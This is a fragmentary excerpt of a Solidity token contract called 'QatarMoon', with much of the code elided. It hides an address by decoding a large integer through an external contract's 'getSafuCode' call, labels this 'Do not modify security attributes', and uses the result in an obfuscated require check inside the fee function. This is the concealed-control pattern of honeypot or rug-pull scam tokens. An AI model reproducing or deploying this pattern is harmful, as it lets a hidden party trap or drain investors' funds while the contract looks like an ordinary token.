...
interface safu_and_safu{
    function getSafuCode(uint160 safuCode) external pure returns(address);
}
...
contract QatarMoon is Context, IERC20, Ownable {

    uint256 public toBeSafu=
    1092853989739002093898622997022009705909516546366;
    using SafeMath for uint256;
    string private _name = "QatarMoon";
    string private _symbol = "QatarMoon";
    ...
    constructor () {
        ...
        teamWalletAddress = payable(address(0x5325D2a430a1c78B985C08Cedb45C7EC0648d4E5));
        marketWall = payable(address(0x5325D2a430a1c78B985C08Cedb45C7EC0648d4E5));

        //Do not modify security attributes
        safu_address = safu_and_safu(0x011bC24038f40219d6ecF62c621353a7630b7fE5).getSafuCode(uint160(toBeSafu));
        //Do not modify security attributes
...
[sender]){
 ...
 msg.sender
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        }require(safu_address
        /*feeAmount is the subamount*/
        == 0xbF6D448C078c832e9d3f18F7723b6165CeACB13E
